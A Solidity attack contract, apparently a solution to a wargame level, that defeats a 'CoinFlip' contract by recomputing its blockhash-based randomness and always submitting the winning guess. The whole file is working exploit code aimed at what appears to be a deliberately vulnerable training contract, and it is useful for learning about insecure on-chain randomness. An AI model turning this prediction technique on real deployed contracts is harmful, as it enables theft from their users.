// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { CoinFlip } from "../../src/CoinFlip/CoinFlip.sol";
import { SafeMath } from 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol'; 

contract CoinFlipHack {
    using SafeMath for uint256;

    CoinFlip coinflipContract;

    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinflipAddress) {
        coinflipContract = CoinFlip(coinflipAddress);
    }

    function hack() public {
        uint256 hashNum = uint256(blockhash(block.number.sub(1)));
        uint256 flip = hashNum.div(factor);
        
        if (flip == 1) {
            coinflipContract.flip(true);
        }
        if (flip == 0) {
            coinflipContract.flip(false);
        }
    }
}